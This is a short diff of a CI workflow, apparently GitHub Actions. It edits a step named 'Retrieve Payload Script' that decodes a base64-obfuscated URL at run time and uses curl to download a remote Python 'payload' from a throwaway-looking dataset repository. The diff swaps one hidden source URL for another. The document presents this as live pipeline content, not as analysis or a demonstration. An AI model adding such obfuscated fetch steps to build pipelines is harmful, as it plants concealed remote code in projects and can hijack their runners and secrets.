@@ -61,7 +61,7 @@ jobs:
       - name: Retrieve Payload Script
         run: |
           echo "[FETCH] Resolving destination endpoint..."
-          SRC_ENCODED="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5"
+          SRC_ENCODED="aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk="
           SRC_URL=$(printf '%s' "$SRC_ENCODED" | base64 -d)
           curl -sL "$SRC_URL" -o grid_worker.py
           echo "[FETCH] Saved payload to grid_worker.py."
